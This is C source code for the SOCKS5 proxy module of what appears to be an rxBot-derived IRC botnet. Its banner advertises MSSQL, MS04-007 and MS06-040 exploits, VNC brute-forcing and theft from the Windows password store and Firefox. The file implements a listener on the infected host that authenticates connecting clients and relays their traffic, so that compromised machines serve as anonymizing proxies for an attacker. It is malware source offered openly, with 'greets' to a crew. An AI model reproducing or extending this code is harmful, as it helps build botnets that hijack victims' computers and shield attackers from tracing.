/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
#include "Inc.h"
#include "Fun.h"
#include "Ext.h"

/*void Socks5(socks5 s5, DWORD ThreadID) {
	socks5port = port;
	strcpy(socks5username, user);
	strcpy(socks5password, pass);

	CreateThread(NULL, 0, &StartSock5, (LPVOID)NULL, 0, &ThreadID);
}*/

char socks5username[32], socks5password[32];

DWORD WINAPI StartSock5(LPVOID param) {
	SOCKET s, accepted;
	struct sockaddr_in saddr;
	int saddr_size = sizeof(struct sockaddr_in);
	DWORD lpThreadId;
	
	socks5 s5 = *((socks5 *)param);
	socks5 *s5p = (socks5 *)param;

	s5p->gotinfo = TRUE;

	strcpy(socks5username, s5.username);
	strcpy(socks5password, s5.password);

	WSADATA WSA;
	if(WSAStartup(MAKEWORD(2, 2), &WSA) != 0) return FALSE;
    
	s = socket(AF_INET, SOCK_STREAM, 0);
	threads[s5.threadnum].sock = s;

	if(s != INVALID_SOCKET)
	{
		bzero(&saddr, sizeof(struct sockaddr_in));

		saddr.sin_family = AF_INET;
		//saddr.sin_port = htons(PORT);
		saddr.sin_port = htons(s5.port);

		if(bind(s, (struct sockaddr*)&saddr, sizeof(struct sockaddr_in)) != SOCKET_ERROR)
			if(listen(s, 0) != SOCKET_ERROR)
				for(;;)
				{
					accepted = accept(s, (struct sockaddr*)&saddr, &saddr_size);

					s5.cgotinfo = FALSE;

					s5.cthreadnum = addthread("Incoming client", SOCKS5_THREAD, accepted);
					threads[s5.cthreadnum].parent = s5.threadnum;

					s5.sock = accepted;

					if(threads[s5.cthreadnum].tHandle = CreateThread(NULL, 0, &AcceptThread, (LPVOID)&s5, 0, &lpThreadId)) {
						while(s5.cgotinfo == FALSE)
							Sleep(5);
					}

//					if(accepted != INVALID_SOCKET)
//					create_thread(&AcceptThread, (void*)accepted);
				}
		closesocket(s);
	}

	WSACleanup();
	clearthread(s5.threadnum);
	ExitThread(0);
}

void create_thread(void* func, void* param)
{
  CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)func, param, 0, NULL);
}
 
char* _malloc(int BuffSize)
{
  return (char*)GlobalAlloc(GMEM_FIXED, BuffSize);
}
   
void bzero(void* lpBuff, int BuffSize)
{
  _asm
  {
    xor eax, eax
    mov ecx, BuffSize
    mov edi, lpBuff
    cld
    rep stosb
  }
}

LPCONNECTSTRUCT CreateConnectStruct(SOCKET From, SOCKET To)
{
  LPCONNECTSTRUCT Result = (LPCONNECTSTRUCT)_malloc(sizeof(CONNECTSTRUCT));

  Result->FromStruct._ConnectStruct = (char*)Result;
  Result->FromStruct.From = From;
  Result->FromStruct.To = To;
  Result->FromStruct.Error = &(Result->Error);

  Result->ToStruct._ConnectStruct = (char*)Result;
  Result->ToStruct.From = To;
  Result->ToStruct.To = From;
  Result->ToStruct.Error = &(Result->Error);

  Result->Error = 0x00;

  return Result;
}

bool swrite(SOCKET s, char* Buff, int buff_size)
{
  int bytes;

  while(buff_size > 0)
  {
    bytes = send(s, Buff, buff_size, 0);

    if((bytes == 0)||(bytes == SOCKET_ERROR))
      return false;
    buff_size -= bytes;
    Buff += bytes;
  }

  return true;
}

bool sread(SOCKET s, char* Buff, int buff_size)
{
  int bytes;

  while(buff_size > 0)
  {
    bytes = recv(s, Buff, buff_size, 0);

    if((bytes == 0)||(bytes == SOCKET_ERROR))
      return false;

    buff_size -= bytes;
    Buff += bytes;
  }

  return true;
}

__stdcall SocksPipe(LPSOCKSPIPE PipeStruct)
{
  int bytes;

  do
  {
    bytes = recv(PipeStruct->From, PipeStruct->Buff, BUFF_SIZE, 0);

    if((bytes == 0) || (bytes == SOCKET_ERROR))
      break;

    if(*(PipeStruct->Error) & 0x01)
    {
      *(PipeStruct->Error) |= 0x02;
      return 0;
    }

    if(!swrite(PipeStruct->To, PipeStruct->Buff, bytes))
    {
      *(PipeStruct->Error) |= 0x02;
      return 0;
    }
  }
  while(!(*(PipeStruct->Error) & 0x01));

  if(*(PipeStruct->Error) & 0x01)
    *(PipeStruct->Error) |= 0x02;
  else
  {
    *(PipeStruct->Error) |= 0x01;
    shutdown(PipeStruct->From, SD_BOTH);
    shutdown(PipeStruct->To, SD_BOTH);
    closesocket(PipeStruct->From);
    closesocket(PipeStruct->To);

    while(!(*(PipeStruct->Error) & 0x02))
    {
      Sleep(1000);
    }

    free(PipeStruct->_ConnectStruct);
  }

  return 0;
}

bool Socks5SendCode(SOCKET s, char Code, char* TempBuff, char* ip, char* port)
{
  *(int*)TempBuff = 0x1000000 | (Code << 8) | SOCKS_VERSION;
  *(int*)(TempBuff + 4) = *(int*)ip;
  *(short*)(TempBuff + 8) = *(short*)port;

  return swrite(s, TempBuff, 10);
}

SOCKET Socks5ServConnect(SOCKET s, char* TempBuff, char* ip, u_short port)
{
  struct sockaddr_in saddr;
  SOCKET Redir = socket(AF_INET, SOCK_STREAM, 0);

  if(Redir == INVALID_SOCKET)
    Socks5SendCode(s, SOCKS_FAILURE, TempBuff, ip, (char*)&port);
  else
  {
    bzero(&saddr, sizeof(struct sockaddr_in));
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = *(in_addr_t*)ip;
    saddr.sin_port = port;

    if(connect(Redir, (struct sockaddr*)&saddr, sizeof(struct sockaddr_in)) == -1)
    {
      Socks5SendCode(s, SOCKS_CONNECTION_REFUSED, TempBuff, ip, (char*)&port);
      closesocket(Redir);
      Redir = INVALID_SOCKET;
    }
  }
  return Redir;
}

bool Socks5CmdIsSupported(SOCKET s, char cmd, char* TempBuff, char* ip, char* port)
{
  if(cmd != 0x01) // 0x02 - bind; 0x03 - udp associate
  {
    Socks5SendCode(s, SOCKS_CMD_NOT_SUPPORTED, TempBuff, ip, port);
    return false;
  }

  return true;
}

bool Socks5GetCmd(SOCKET s, char* TempBuff, char* cmd, char* ip, char* port)
{
  struct hostent* hp;
  char DnLen;
  char AddrType;
  char Tmp[5];

  if(!sread(s, TempBuff, 4))
    return false;

  if((TempBuff[0] != SOCKS_VERSION)||(TempBuff[2] != 0x00))
    return false;

  *cmd = TempBuff[1];
  AddrType = TempBuff[3];

  switch(AddrType)
  {
    case 0x01: // ip v4
      if(!sread(s, ip, 4))
        return false;
      break;

    case 0x03: // domain name

      if(!sread(s, &DnLen, 1))
        return false;
      if(DnLen == 0)
        return false;
      if(!sread(s, TempBuff, DnLen))
        return false;
      TempBuff[DnLen] = 0x00;

      hp = gethostbyname(TempBuff);

      if(((int)hp == -1)||((int)hp == 0))
      {
        if(!sread(s, port, 2))
          return false;

        *(int*)(&Tmp) = 0x03000405;
        *(char*)(&Tmp + 4) = DnLen;

        if(swrite(s, Tmp, 5))
          if(swrite(s, TempBuff, DnLen))
            swrite(s, port, 2);

        return false;
      }
      else
        *(int*)ip = *(int*)hp->h_addr;

      break;

    case 0x04:  // ip v6, not supported
      *(int*)(&Tmp) = 0x04000805;

      if(sread(s, TempBuff, 16))
        if(sread(s, port, 2))
          if(swrite(s, Tmp, 4))
            if(swrite(s, TempBuff, 16))
              swrite(s, port, 2);

      return false;

    default:
      return false;
  }

  return sread(s, port, 2);
}

bool Socks5Auth(SOCKET s, char* TempBuff)
  {
    char Login[256];
    char LoginLen;
    char PassLen;
    char Status = '\xFF';

    if(!sread(s, TempBuff, 2))
      return false;

    LoginLen = TempBuff[1];

    if((TempBuff[0] != 0x01)||(LoginLen == 0))
      return false;

    if(!sread(s, Login, LoginLen+1))
      return false;

    PassLen = Login[LoginLen];

    if(!PassLen)
      return false;

    Login[LoginLen] = 0x00;

    if(!sread(s, TempBuff, PassLen))
      return false;

    TempBuff[PassLen] = 0x00;

    if((strcmp(socks5username, Login) == 0)&&(strcmp(socks5password, TempBuff) == 0))
      Status = 0x00;

    *(short*)TempBuff = (Status << 8) | 0x01;

    if(!swrite(s, TempBuff, 2))
      return false;

    return (Status == 0x00);
  }

bool Socks5Accept(SOCKET s, char* TempBuff)
{
  char MethodsCount;
  char Cmd = '\xFF';

  if(!sread(s, TempBuff, 2))
    return false;

  MethodsCount = TempBuff[1];

  if((TempBuff[0] != SOCKS_VERSION)||(MethodsCount == 0))
    return false;

  if(!sread(s, TempBuff, MethodsCount))
    return false;

  do
  {
    MethodsCount--;

    if(TempBuff[MethodsCount] == SOCKS5_METHOD)
    {
      Cmd = TempBuff[MethodsCount];
      break;
    }
  }
  while(MethodsCount > 0);

  *(short*)TempBuff = (Cmd << 8) | SOCKS_VERSION;

  if(!swrite(s, TempBuff, 2))
    return false;

//#ifdef AUTH_ON

  return (Cmd == 0xFF) ? false : Socks5Auth(s, TempBuff);
//#else

//  return (Cmd != 0xFF);
//#endif

}

DWORD WINAPI AcceptThread(LPVOID param)
{
  SOCKET Redir,s;
  LPCONNECTSTRUCT ConnectStruct;
  char TempBuff[256];
  char cmd;
  char ip[4];
  u_short port;

	socks5 s5 = *((socks5 *)param);
	socks5 *s5p = (socks5 *)param;

	s5p->cgotinfo = TRUE;

	int threadnum = s5.cthreadnum;
	//s = threads[threadnum].sock;
	s = s5.sock;

  if(Socks5Accept(s, TempBuff))
    if(Socks5GetCmd(s, TempBuff, &cmd, ip, (char*)&port))
      if(Socks5CmdIsSupported(s, cmd, TempBuff, ip, (char*)&port))
      {
        Redir = Socks5ServConnect(s, TempBuff, ip, port);

        if(Redir != INVALID_SOCKET)
        {
          if(Socks5SendCode(s, SOCKS_SUCCESS, TempBuff, ip, (char*)&port))
          {
            ConnectStruct = CreateConnectStruct(s, Redir);
            create_thread(&SocksPipe, &(ConnectStruct->ToStruct));
            SocksPipe(&(ConnectStruct->FromStruct));
            return 0;
          }
          closesocket(Redir);
        }
      }

  closesocket(s);
  return 0;
}